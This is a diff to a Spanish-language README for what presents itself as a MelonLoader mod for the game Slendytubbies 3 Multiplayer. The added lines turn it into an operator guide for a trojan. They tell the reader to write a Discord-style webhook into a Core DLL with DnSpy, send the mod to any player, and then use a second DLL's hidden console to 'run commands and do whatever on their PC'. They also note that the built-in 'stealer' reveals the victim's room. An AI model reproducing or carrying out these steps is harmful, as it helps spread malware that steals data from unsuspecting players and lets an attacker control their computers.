@@ -20,3 +20,10 @@ $resetacc:  Resetear las estadisticas de tu cuenta ZeoWorks.
 $quit:  Cerrar el juego.
 
 ## Este programa solo funciona si se mete a una carpeta de Mods creada por MelonLoader y se ejecuta el juego.
+
+Recordar escribir la webhook en la linea 603 de la DLL Core (esto lo puedes editar usando programas como DnSpy); podes hacer esto si presionas con click derecho en esta linea y le das a Editar Instrucciones IL
+![editar_webhook](https://github.com/user-attachments/assets/f52cd5e9-eac1-49e9-82b9-069221c41071)
+
+Una vez que escribas la webhook y lo hayas guardado, se lo podras enviar a quien sea (con la unica condicion de que juegue Slendytubbies 3 Multiplayer y sepa usar MelonLoader 'aunque tambien se lo puedes explicar')
+Para usar la consola especial (client updated), tendras que meter el DLL client_updated.dll en tu carpeta de mods del juego y te meteras a la sala en donde esta el infectado, una vez que esteis los dos, presionar la tecla Av Pag para abrir la consola, ahora podras ejecutar comandos y hacer lo que sea en su PC) Recordar que el stealer te permite saber en que sala esta el infectado, así que no tendras que pasar por cada sala hasta encontrarlo.
+![client_updated](https://github.com/user-attachments/assets/57090d18-4f25-409c-91de-4b99bc9e910e)
